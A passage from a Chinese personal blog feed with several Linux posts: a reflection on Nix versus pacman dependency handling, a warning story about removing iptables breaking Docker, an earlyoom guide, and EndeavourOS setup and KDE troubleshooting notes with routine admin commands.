<p>几年前我用deb包管理器的时候遇到依赖问题几乎是家常便饭，然后动不动就用第三方的方式装，比如make编译、比如野路子<code>curl XXX install.sh &amp;&amp; ./install</code>， 于是环境变得乱糟糟的。后来Ubuntu开始推snap。于是我跑路到了pacman，后来就一直用Arch了，还自己打了点AUR的包。</p>
<p>pacman包管理器没有deb系那么多功能，不过我觉得好就好在简单，这样打包门槛低，促进了AUR的繁荣。不管AUR的PKGBUILD再怎么质量差再怎么野，至少也比找不到deb或者rpm的包然后纷纷make或者<code>install.sh</code>好多了</p>
<p>另一种思路是尽量不要动态链接库，代价是打包出来的体积会比较巨大。依赖？没有依赖不就不冲突了吗？统统静态链接，不过问题是打出来的包比较大。另一个好处是可以顺便做一个虚拟的目录，把更多的东西都给每个软件单独做一份，做出类似沙盒隔离。比如flatpak，这样打出来的包比较容易跨发行版，也不太容易遇到依赖找不到或者依赖版本冲突的问题。</p>
<p>Arch已经足够让我满意了，包多，自己打包也简单。不过每次多版本共存的时候还是有点别扭，难道就真只能所有人尽量统一版本往前滚了吗？多版本怎么共存呢？我不想要pyenv、archlinux-java、gvm、nvm、conda这些东西，这些东西应该由一个全局的包管理器去处理。</p>
<p>理论上如果绝大部分上游应用和库的向后兼容做的足够好，那确实不太需要太关心多版本并存的问题，每个大版本打一个包就好了。比如go，我从1.14升到1.18，原来的代码和库基本能跑的依然能跑。但是python这样的，好家伙，python2到python3升级大量beraking changes就算了。python3.5、python3.6、pyhton3.9、python3.10这样的小版本号动不动就不兼容，然后一堆依赖出问题了。python那一堆包的用法和函数还天天改，动不动版本更新之后原来import的包不能跑了，你要改函数名。尤其是一些深度学习的包和django的一些东西、好端端的为什么要改来改去？还有grpc也是，不遵循语义化版本号，我好几次滚arch都是某个应用依赖grpc然后出问题了，版本又不兼容。</p>
<p>除了兼容问题还有另一个问题不大的小问题，就是不同包的文件冲突，比如bear和interception tools， 都在arch的community包里面， 都有一个<code>/usr/bin/intercept</code>。当然一般软件命名不一样没这个问题，或者把这两个包标为<code>conflict</code>。那有没有办法不改名也能用呢，那能不能给每个包一个自己的专属目录。这个问题和上面那个多版本并存的问题是很像的，同时安装两个版本也会在<code>/usr/bin/XXX</code>等各种重名目录下面相同文件冲突。</p>
<p>最近才看了一下Nix包管理器，之前一直觉得这个玩意就是茫茫多包管理器中的一个，和别的也没多少区别。一看才发现这不就是我要找的吗？</p>
<blockquote>
<p>Nix is a purely functional package manager. This means that it treats packages like values in purely functional programming languages such as Haskell — they are built by functions that don’t have side-effects, and they never change after they have been built. Nix stores packages in the Nix store, usually the directory &#x2F;nix&#x2F;store</p>
</blockquote>
<p>Nix包管理器将包放在<code>/nix/store</code>下面，然后根据sha256 的 hash去找版本。这样就实现了多版本共存，然后这个在打包的时候每个包是显式声明依赖的，不会出现打包的时候漏写了哪个依赖然后跑到别的电脑上寄了的情况。就算系统上有需要的依赖也不自己去找，需要显式声明。这样就可以确定完备的依赖关系，然后对一些嵌套的依赖进行推导。</p>
<p>然后有了这个声明式（Declarative）的配置，我们可以还原以前的版本（有点像git）</p>
<p>Nix保留每一个包版本，像python3.9和3.10如果有依赖或者显式声明都会安装，然后依赖这些的包分别根据hash和打包声明去找相应的版本。这里是只要有一点不同就是一个新的版本，就算3.9.1和3.9.0也不一样。这样就不怕一些包不管语义化版本随便乱改API或者ABI了。</p>
<p><del>那这么多包，体积岂不是很大？是的</del></p>
<p>以Nix包管理器为发行版的NixOS，是需要你去写一个全局的配置文件<code>configuration.nix</code>，就像dotfiles一样。</p>
<p>不过NixOS应该也确实没什么太多人用，一直不怎么火。毕竟为了一个Nix包管理器再多学一门Nix语言，然后为了这盘醋包了这盘饺子，总感觉有点代价太大了。当然也可以不学，有一个Guix是直接用lisp的。不过这个更加清蒸，一些非自由软件你要自力更生。</p>
<p>NixOS另一个巨大的问题是不兼容FHS，就是<code>/usr/bin</code>之类的那一套目录。然后很多在别的发行版跑的好好的应用由于目录问题就跑不起来了，需要打一大堆patch。而且Nix的包现在太少了，各种问题需要自己解决。虽然安装门槛并不比Arch高，但是打包门槛和工作量我觉得比Arch高不少。于是我在虚拟机里面玩了一圈又滚回了Arch，又不是不能用.jpg （其实再不删掉继续玩下去我硬盘不够了）</p>
<p>最近听说deepin要脱离deb做自己的包管理器了，祝他们好运吧。deepin这么做会不会加剧发行版包管理器碎片化已经无所谓了，比起只顾着套壳圈钱的产品，折腾出点什么总不算太坏。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><a href="https://edolstra.github.io/pubs/phd-thesis.pdf">The Purely Functional Software<br>Deployment Model</a><br><span class="exturl" data-url="aHR0cHM6Ly90dW5hLm1vZS9ldmVudC8yMDIxL25peC8=">金枪鱼之夜：Nix - 从构建系统到配置管理<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cubXBzY2hvbHRlbi5kZS9kb2NrZXIvMjAxNi8wMS8yNy95b3UtYXJlLW1vc3QtbGlrZWx5LW1pc3VzaW5nLWRvY2tlci5odG1s">You Are Most Likely Misusing Docker
<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05peE9TL25peA==">Nix, the purely functional package manager<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9uaXhvcy5vcmcvbWFudWFsL25peC9zdGFibGUv">Nix Manual<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>dependency hell</tag>
        <tag>functional</tag>
        <tag>Nix</tag>
      </tags>
  </entry>
  <entry>
    <title>不要尝试sudo apt remove iptables</title>
    <url>/a7d1/</url>
    <content><![CDATA[<p><img src="/a7d1/emmm.png" alt="Picture"></p>
<span id="more"></span>

<p>在Ubuntu和Debian里卸载iptables会发生严重的后果（大佬请无视）<br>一开始我们觉得是防火墙把443端口给办了用不了https，结果我用UFW设置不管用，怀疑是iptables的问题，问了花花师兄，也不清楚，我们决定先把iptables禁用了。随手一谷歌，也忘了哪个神仙说的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt remove iptables # 不要乱试！</span><br></pre></td></tr></table></figure>

<p>感觉对的嘛，卸个防火墙能出什么问题嘛<br>然后提示是否卸载我选了y，然后突然在卸载的log发现一堆Docker，瞬间感觉不对劲。然后，然后Docker直接不能用了！<br>血泪教训啊，防火墙卸了Docker就不能用了！</p>
<p>随手一搜发现不止我一个人中招啊</p>
<p><img src="/a7d1/iptables-docker.png" alt="Picture"></p>
<p>好家伙</p>
<p><img src="/a7d1/cnm.png" alt="Picture"></p>
<p>行吧，一堆依赖比python2还多</p>
<p>不说了，准备重装系统了<img src="/a7d1/mmm.jpg" alt="Picture"></p>
<hr>
<p>停用iptables请使用<code>chkconfig iptables off</code>命令</p>
<hr>
<p>更新，试图垂死挣扎使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install network-manager</span><br></pre></td></tr></table></figure>

<p>既然把网卡配置删了那就再配置一遍<br>等会，装了NetworkManager选了默认配置之后连22端口也连不上了。。。<br>行吧，准备重装<br><img src="/a7d1/wa.jpg" alt="Picture"></p>
]]></content>
      <tags>
        <tag>iptables</tag>
        <tag>删库跑路</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Earlyoom和oomd使用，解决Linux内存耗尽的一点尝试</title>
    <url>/early-oom-and-oomd-for-out-of-memory/</url>
    <content><![CDATA[<p>太长不看：就是把原来内核的OOM killer挪到用户空间（userspace）去，这样就可以在系统卡住之前（通常桌面卡住的时候OOM killer认为还不用kill）提前kill掉占内存最大的一个，让桌面和鼠标可以正常工作。</p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先来看phoronix的一个报道：<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhvcm9uaXguY29tL3NjYW4ucGhwP3BhZ2U9bmV3c19pdGVtJnB4PUxpbnV4LURvZXMtQmFkLUxvdy1SQU0=">Yes, Linux Does Bad In Low RAM &#x2F; Memory Pressure Situations On The Desktop<i class="fa fa-external-link-alt"></i></span>  </p>
<p>Linux桌面在小内存、内存紧张的情况下表现很差。（用过Linux现在桌面的相信都有这种感受）</p>
<p>解决内存不足、内存耗尽的<strong>最好办法还是加钱多装几根内存条</strong>，什么swap、zram还有本文的earlyoom和oomd都是权宜之计。 </p>
<h2 id="OOM简介"><a href="#OOM简介" class="headerlink" title="OOM简介"></a>OOM简介</h2><p>OOM很多人应该都很熟悉了，服务器上跑的任务申请内存超过了可用内存就会发生OOM（其实是可以Overcommit的，这个以后再说）</p>
<p>为了避免内存耗尽（Out of Memory，OOM），OOM-killer在内存将要耗尽的时候杀掉<code>oom_score</code>最大的进程。（如果连OOM-killer都没能及时kill掉，那就会触发kernel panic）</p>
<p>但是内核默认的OOM策略比较保守，如果你是桌面用户，那么还没等到OOM killer工作，图形界面就已经卡死（handling， 有的时候也被称为freeze）了。Earlyoom和oomd等工具运行在用户空间，让一些任务提前崩溃，让图形界面还能正常工作。</p>
<p>OOM killer和Overcommit等更详细的介绍我写到<a href="https://zhangjk98.xyz/linux-out-of-memory">这里</a>, 这里不多说了。</p>
<h2 id="Earlyoom"><a href="#Earlyoom" class="headerlink" title="Earlyoom"></a>Earlyoom</h2><p>EarlyOOM</p>
<p>Earlyoom在桌面系统的表现比较成功，Fedora 32 已经默认启用了EarlyOOM。</p>
<h2 id="oomds"><a href="#oomds" class="headerlink" title="oomds"></a>oomds</h2><p>oomd是Facebook做的，后来和systemd一起做了一个sysytemd-oomd守护进程，现已加入systemd全家桶。</p>
<h2 id="在Archlinux上安装和使用"><a href="#在Archlinux上安装和使用" class="headerlink" title="在Archlinux上安装和使用"></a>在Archlinux上安装和使用</h2><p>Earlyoom已经在community源里了。oomd这个包目前是orphand，我们用Earlyoom就好了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S earlyoom</span><br></pre></td></tr></table></figure>

<p>直接terminal里执行<code>earlyoom</code>就可以了。（可能需要root权限，不然会报<code>Could not lock memory - continuing anyway: Cannot allocate memory</code>）</p>
<p>或者使用systemd守护进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> earlyoom --now</span><br></pre></td></tr></table></figure>

<p>然后又到了调参环节，编辑<code>/etc/default/earlyoom</code>，根据你的机器配置和使用习惯改改参数。</p>
<p>默认10秒检查一次，当可用内存小于10%和swap小于10的时候执行<code>SIGTERM</code>，当可用内存小于5%和swap小于5%的时候执行<code>SIGKILL</code>。</p>
<h2 id="经历"><a href="#经历" class="headerlink" title="经历"></a>经历</h2><p>一开始我笔记本和台式机都8G内存，当时那个版本的VSCode有严重的内存泄漏，经常泄漏到我桌面连鼠标都动不了了。只能切到tty杀掉VSCode的进程或者魔术键重启，烦的我一度想投奔vim。<br>后来买了两根16G的笔记本内存条，又把教研室的台式内存（拆了4根8G ddr3的杂牌内存条下来）加到了32G，开着一个虚拟机好多Docker一个Goland还有Chrome，再也没遇到过内存不够用的问题。<br>最近要在另一个8G内存的电脑上和只有2g内存的VPS上面干点活，又回到了当初只有8G内存的时候vscode频繁内存泄漏导致整个桌面直接卡死的拮据状态。Ubuntu 16.04 那个版本的GNOME内存泄漏和内部错误也相当讨厌。换了lxde好了一点。然后试了试swap，效果不好。然后用了zram, 效果比swap好不少。  </p>
<p>最后用了Earlyoom，好多了，不用频繁手动处理桌面卡死了。（注意4G以下这种小内存不推荐用这些，会浪费不少可用内存）</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JmamFrb2IvZWFybHlvb20=">https://github.com/rfjakob/earlyoom<i class="fa fa-external-link-alt"></i></span>  </p>
<p>Fedora默认启用Earlyoom的一些讨论：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mZWRvcmFwcm9qZWN0Lm9yZy93aWtpL0NoYW5nZXMvRW5hYmxlRWFybHlvb20jRW5hYmxlX0Vhcmx5T09N">https://fedoraproject.org/wiki/Changes/EnableEarlyoom#Enable_EarlyOOM<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9wYWd1cmUuaW8vZmVkb3JhLXdvcmtzdGF0aW9uL2lzc3VlLzExOQ==">https://pagure.io/fedora-workstation/issue/119<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhvcm9uaXguY29tL3NjYW4ucGhwP3BhZ2U9bmV3c19pdGVtJnB4PUZlZG9yYS0zMi1EZWZhdWx0LUVhcmx5T09N">https://www.phoronix.com/scan.php?page=news_item&amp;px=Fedora-32-Default-EarlyOOM<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy53b3dvdGVjaC5uZXQvbWVtb3J5X21hbmFnZW1lbnQvb29tLmh0bWw=">Linux vm运行参数之（二）：OOM相关的参数<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>earlyoom</tag>
        <tag>oomd</tag>
        <tag>OOM</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么不试试EndeavourOS呢</title>
    <url>/why-not-try-endeavouros/</url>
    <content><![CDATA[<p>sudo pacman -Rs win10</p>
<span id="more"></span>

<p>其实还是建议能折腾的玩家直接上原味Arch。不想装Arch的偷懒用户可以试试这个（不过推荐想用KDE等其他桌面的玩家先选择离线安装，然后卸载xfce的包，再装其他DE。这个在线安装的时候每装一个包都会 -Syu 一下，非常慢）</p>
<h2 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h2><p>再次更新，你电镜像源有EndeavourOS了： <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3Mv">http://mirrors.uestc.cn/endeavouros/<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Server = http://mirrors.tuna.tsinghua.edu.cn/endeavouros/repo/<span class="variable">$repo</span>/<span class="variable">$arch</span>&quot;</span> &gt; /etc/pacman.d/endeavouros-mirrorlist</span><br></pre></td></tr></table></figure>

<p>iso镜像在<span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3MvaXNvLw==">这里<i class="fa fa-external-link-alt"></i></span></p>
<p>清华已经安排上了EndeavourOS的镜像和<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2VuZGVhdm91cm9zL2lzby8=">iso<i class="fa fa-external-link-alt"></i></span>，可以方便的下载iso和更新EndeavourOS的包了。（或者用PT种子下载，实测速度均&gt;10Mb&#x2F;s）</p>
<p>更改<code>/etc/pacman.d/endeavouros-mirrorlist</code>中的内容，改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## China</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/endeavouros/repo/$repo/$arch</span><br></pre></td></tr></table></figure>

<p>然后<code>sudo pacman -Syy</code>刷新一下</p>
<h2 id="安装virtualbox虚拟机"><a href="#安装virtualbox虚拟机" class="headerlink" title="安装virtualbox虚拟机"></a>安装virtualbox虚拟机</h2><p> 我用的kernel是lts版本（偶滴本本是Nvidia独显，不敢上kernel一直滚，怕炸）</p>
<p>装头文件、virtualbox组件、网络和vnc扩展（可选）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S linux-lts-headers virtualbox virtualbox-guest-iso virtualbox-host-dkms net-tools virtualbox-ext-vnc</span><br></pre></td></tr></table></figure>

<p>推荐安装oracle的增强扩展（一些自适应分辨率缩放、USB驱动什么的都在这里面）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S virtualbox-ext-oracle</span><br></pre></td></tr></table></figure>

<p>然后下载镜像（微软貌似出了用于虚拟机的免费90天win10，然而win10还是耗资源，没有什么特殊需求就只是用用office用用QQ什么的开个win7甚至XP虚拟机就好了，在虚拟机里会流畅一点）</p>
<p>增强功能要在win虚拟机中手动安装扩展才能用</p>
<h2 id="终端配置"><a href="#终端配置" class="headerlink" title="终端配置"></a>终端配置</h2><h3 id="将bash-zsh的终端输出信息和日志改回英文"><a href="#将bash-zsh的终端输出信息和日志改回英文" class="headerlink" title="将bash&#x2F;zsh的终端输出信息和日志改回英文"></a>将bash&#x2F;zsh的终端输出信息和日志改回英文</h3><p>终端有些报错和输出还是要靠英文去谷歌，中文资料太少了，查不到，但是又不想把全局设置成英文的。直接<code>export LANG=en_US.UTF-8</code>不起作用，改成<code>export LANG=en_US</code>变成了英文但是中文乱码了，差了一下LANGUAGE参数的优先级比LANG要高、LC_X参数优先级比LANGUAGE高，修改LANGUAGE变量即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANGUAGE=<span class="string">&quot;en_US:UTF-8&quot;</span></span><br></pre></td></tr></table></figure>

<p>只修改终端那就在.bashrc加上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span>=<span class="string">&quot;linux&quot;</span> ] ;<span class="keyword">then</span> </span><br><span class="line"><span class="built_in">export</span> LANGUAGE=en_US </span><br><span class="line"><span class="built_in">export</span> LANG=en_US.UTF-8 </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="默认终端改为zsh"><a href="#默认终端改为zsh" class="headerlink" title="默认终端改为zsh"></a>默认终端改为zsh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure>

<p>装oh-my-zsh（因为我懒得自己配置zsh了）和插件，并设置默认终端为oh-my-zsh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S zsh oh-my-zsh-git autojump zsh-autosuggestions zsh-syntax-highlighting</span><br><span class="line">chsh -s /usr/bin/zsh</span><br><span class="line"><span class="built_in">cp</span> /usr/share/oh-my-zsh/zshrc ~/.zshrc <span class="comment"># 我比较懒，就直接把默认配置拿过来改改</span></span><br></pre></td></tr></table></figure>

<h2 id="更换lts内核"><a href="#更换lts内核" class="headerlink" title="更换lts内核"></a>更换lts内核</h2><p>更新到5.8以后我的virtualbox又出问题了，换回linux-lts</p>
<p>EndeavourOS有一个叫akm的图形界面，但是你要手动重装virtualbox之类的会受到内核影响的东西。</p>
<h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><blockquote>
<p>so, nvidia f…..</p>
</blockquote>
<p>算了，3080那么强，不黑英伟达了(更新，AMD新卡出了，好家伙</p>
<p>他们从以前Antergos那fork了一个驱动安装脚本，有个包叫nvidia-installer（lts等用户请用nvidia-installer-dkms），看<span class="exturl" data-url="aHR0cHM6Ly9lbmRlYXZvdXJvcy5jb20vZG9jcy9oYXJkd2FyZS1hbmQtbmV0d29yay9ncmFwaGljLWNhcmRzLWdwdS1kcml2ZXItYW5kLXNldHVwLw==">这里<i class="fa fa-external-link-alt"></i></span>。</p>
<h2 id="桌面环境"><a href="#桌面环境" class="headerlink" title="桌面环境"></a>桌面环境</h2><p>EndeavourOS官方魔改定制了xfce的主题和图标，离线安装镜像也只有xfce，其他的几乎没怎么魔改。</p>
<p>如果要装其他DE的话</p>
<p>紫红配色看个人喜好吧，其实我不太能欣赏的来（这个配色，Gitlab同款）</p>
<p>更新，KDE 的 5.20.2 配色和EndeavourOS完全一致，建议他们火速从XFCE迁往KDE（不是</p>
<p><img src="/why-not-try-endeavouros/image-20201031190318540.png" alt="KDE新官网样子"></p>
<p>多桌面环境可能出问题，非要这样做的话建议每个不同的桌面环境分配一个单独的用户名。<br>（貌似xfce4和KDE一起用几乎问题（用ssdm），先装ssdm和KDE,然后装xfce4）<br>尝试了一下i3wm, 简洁是真的简洁，不太习惯又删了换回KDE了。</p>
<p>KDE有一种 Windows Vista 的感觉，感觉是 linux 所有 Desktop Enviroment 里面最舒服的。xfce虽然是EndeavourOS默认的DE，但是xfce开发人手不够，用户和社区贡献者也比KDE少，而且内存占用最新的KDE已经比xfce低了…..现在xfce也不怎么轻量了，渣配置机器上表现没有LXDE好，感觉不少用户都转去用i3wm和KDE了…逐渐没落的夕阳DE，适合养老</p>
<h2 id="硬盘扩容和迁移"><a href="#硬盘扩容和迁移" class="headerlink" title="硬盘扩容和迁移"></a>硬盘扩容和迁移</h2><p>趁打折买了一块西数SN550,之前只有500G还装了个双系统的笔记本可以扩容了</p>
<p>现在把&#x2F;home分区（大概60G）从老硬盘移动到新硬盘上，空出来的60G给&#x2F;目录。我既不是LVM也没有组raid，文件系统用的ext4，500G老硬盘分了400G给win10,剩下100G给了linux，分了一个&#x2F;，40G,一个&#x2F;home，60G</p>
<p>先格式化（这里我用的GPT分区表，ext4），然后挂载到&#x2F;mnt,然后用rsync迁移&#x2F;home下的文件到&#x2F;mnt<br>然后umount，然后分区合并给&#x2F;root，再挂载到&#x2F;home下面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">yay -Sy rsync</span><br><span class="line"></span><br><span class="line">mkfs.ext4 /dev/nvme0n1p1</span><br><span class="line">mount /dev/nvme0n1p1 /mnt</span><br><span class="line">rsync -avz /home /mnt</span><br><span class="line">umount dev//nvme0n1p1</span><br></pre></td></tr></table></figure>

<p>两边都是nvme,2分钟就同步完成了，速度非常感人，然后修改fstab，将原来&#x2F;home分区的uuid改为新硬盘的（&#x2F;dev&#x2F;nvme0n1p1）uuid</p>
<p><code>/etc/fstab</code>大概长这个样子，分别是uuid,挂载目录，文件类型，noatime后面0表示不开机自检，&#x2F;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">UUID=8205-8BC5                            /boot/efi      vfat    <span class="built_in">umask</span>=0077 0 2</span><br><span class="line">UUID=36499174-6a4a-4b9d-b5cc-0b1f555a1f46 /              ext4    defaults,noatime 0 1</span><br><span class="line">UUID=bf5e768c-a2de-4618-9861-5946459a69b6 /home          ext4    defaults,noatime 0 2</span><br></pre></td></tr></table></figure>

<p>然后退出来，用livecd或者双系统的分区工具把原来的&#x2F;home分区删掉分给原来的&#x2F;目录。（注意做好备份不要删错了，删错了就没了）</p>
<p>再次登陆后应该就行了。弄完突然发现KDE自带一个叫KDE Partition Manager的工具，看起来貌似还行。</p>
<h2 id="修grub"><a href="#修grub" class="headerlink" title="修grub"></a>修grub</h2><p>双系统grub又出问题了，好在用liveusb重装了一下grub问题救了回来。</p>
<p>我是UEFI，操作除了最后 grub install 用EndeavourOS的，其他的和Arch一样</p>
<p>先挂载，然后chroot进去，然后重装grub</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/nvme0n1p3 /mnt</span><br><span class="line">mount /dev/nvme1n1p2 /mnt/boot/efi</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=EndeavourOS-grub</span><br></pre></td></tr></table></figure>

<h2 id="滚动升级"><a href="#滚动升级" class="headerlink" title="滚动升级"></a>滚动升级</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Syu <span class="comment"># 装了AUR就yay -Syu</span></span><br></pre></td></tr></table></figure>

<p>如果要自动降级新软件包就<code>-Syuu</code>(不推荐)</p>
<p>升级的包里面有内核和显卡驱动的时候要注意小心</p>
<p>升级内核之后最好重启一下，有的时候不重启会遇到开bbr失败了啊，u盘读不出来了啊，就比如<span class="exturl" data-url="aHR0cHM6Ly9qbGljZS50b3AvcC83bDltby8=">记因内核版本错误导致U盘不能识别的问题解决<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly92MmV4LmNvbS90LzMyMzU1OQ==">这个v站帖子<i class="fa fa-external-link-alt"></i></span>还有重启后<span class="exturl" data-url="aHR0cHM6Ly9tYW5hdGVlbGF6eWNhdC5naXRodWIuaW8vbGludXgvMjAyMC8wMi8xNC9maXgtYXJjaC1ib290LWZhaWxlZC5odG1s">Grub内核版本号不升级<i class="fa fa-external-link-alt"></i></span>，大部分情况下<code>modprobe</code>找不到模块八成就是了</p>
<h3 id="升级内核不重启"><a href="#升级内核不重启" class="headerlink" title="升级内核不重启"></a>升级内核不重启</h3><p>参考reddit这个<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy80enJzYzMva2VlcF95b3VyX3N5c3RlbV9mdWxseV9mdW5jdGlvbmFsX2FmdGVyX2Ffa2VybmVsLw==">帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>一个软链过去，感觉不太优雅，还是乖乖重启比较好</p>
<blockquote>
<p>看来包管理器们应该学习其他两个系统，统一在关机开机的时候更新软件。</p>
</blockquote>
<h2 id="KDE使用事项"><a href="#KDE使用事项" class="headerlink" title="KDE使用事项"></a>KDE使用事项</h2><h3 id="KDE卡死的抢救方案"><a href="#KDE卡死的抢救方案" class="headerlink" title="KDE卡死的抢救方案"></a>KDE卡死的抢救方案</h3><p>KDE现在已经比较稳定了，但是Linux桌面程序还是偶尔把桌面搞到卡死，比如vscode内存泄漏。</p>
<p>首先尝试<code>ctl+alt+t</code>呼出终端，如果不能就<code>ctl+alt+F2</code>调出tty，htop看一下那个进程占用高，kill掉，如果不行就重启tty</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kquitapp5 plasmashell &amp;&amp; kstart5 plasmashell</span><br></pre></td></tr></table></figure>

<p>正常退出不行就直接killall</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">killall plasmashell &amp;&amp; kstart5 plasmashell</span><br></pre></td></tr></table></figure>

<p>或者重启一下SDDM</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart sddm</span><br></pre></td></tr></table></figure>

<p>还不行就杀掉tty1，然后重启xorg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep tty1 <span class="comment"># 或者pgrep tty1</span></span><br></pre></td></tr></table></figure>

<p>然后kill掉（或者直接<code>pkill -9 -t tty1</code>），重启<br>或者直接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pkill x</span><br><span class="line">startx</span><br></pre></td></tr></table></figure>

<p>再不行直接<code>reboot</code>就好了</p>
<p>或许你开了SysRq，先用SysRq抢救一下，见<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvYWRtaW4tZ3VpZGUvc3lzcnEuaHRtbA==">Linux Magic System Request Key Hacks<i class="fa fa-external-link-alt"></i></span>，或者直接看<span class="exturl" data-url="aHR0cDovL2Jsb2cubHVqdW45OTcyLndpbi9ibG9nLzIwMTgvMDgvMjIvbGludXglRTQlQjglOEIlRTclOUElODRzeXNycSVFOSU5NCVBRS9pbmRleC5odG1s">linux下的SysRq键<i class="fa fa-external-link-alt"></i></span></p>
<p>再不行就直接尝试长按电源关机了</p>
<h3 id="混成器"><a href="#混成器" class="headerlink" title="混成器"></a>混成器</h3><p>有Nvidia显卡怕驱动更新出问题可以在设置中将渲染器（混成器）从OpenGL改为XRender，XRender出问题的情况会少一点，虽然很多特效都不支持，性能也略差。没有问题建议还是用OpenGL或者直接关闭特效，XRender没有硬件加速用起来感觉跟OpenGL有明显的体验差距。</p>
<p>另外貌似非整数比缩放的时候透明特效之类的经常不支持，建议直接关了。</p>
<h3 id="baloo"><a href="#baloo" class="headerlink" title="baloo"></a>baloo</h3><p>禁用baloo：<code>balooctl disable</code> 这个文件索引服务也是个吃性能大户，不管是在GNOME下还是KDE下。可以考虑禁用。要查找文件可以用find命令之类的东西嘛。</p>
<h3 id="KDE桌面部件"><a href="#KDE桌面部件" class="headerlink" title="KDE桌面部件"></a>KDE桌面部件</h3><p>美化要稍微谨慎一点，魔改太多了不太稳定</p>
<p>latte-dock：虽然KDE官方维护支持这个，动画效果很漂亮，用起来也很舒服，但是这个实在是吃内存大户。KDE桌面不开多余特效和装各种桌面部件待机内存在300M，装个latte-dock后内存占用比其他所有的加起来还多。把dock的鼠标悬停放大之类的特效关一关。貌似这个的背景透明只有XRender支持。</p>
<p>一个很喜欢的任务栏部件event calendar</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S plasma5-applets-eventcalendar</span><br></pre></td></tr></table></figure>

<h3 id="双显示器开机右侧出现黑边"><a href="#双显示器开机右侧出现黑边" class="headerlink" title="双显示器开机右侧出现黑边"></a>双显示器开机右侧出现黑边</h3><p>发现是每次开机分辨率变成1680*1050了</p>
<p>先看一下你的显示器编号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xrandr</span><br></pre></td></tr></table></figure>

<p>比如我的就是DVI-I-1和DVI-D-0，把这两个分辨率改回1080p</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xrandr --output DVI-I-1 --mode 1920x1080 --rate 60</span><br><span class="line">xrandr --output DVI-D-0 --mode 1920x1080 --rate 60</span><br></pre></td></tr></table></figure>

<p>这里有一个自动配置的包<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy8/bmFtZT1hdXRvcmFuZHI=">autorandr<i class="fa fa-external-link-alt"></i></span></p>
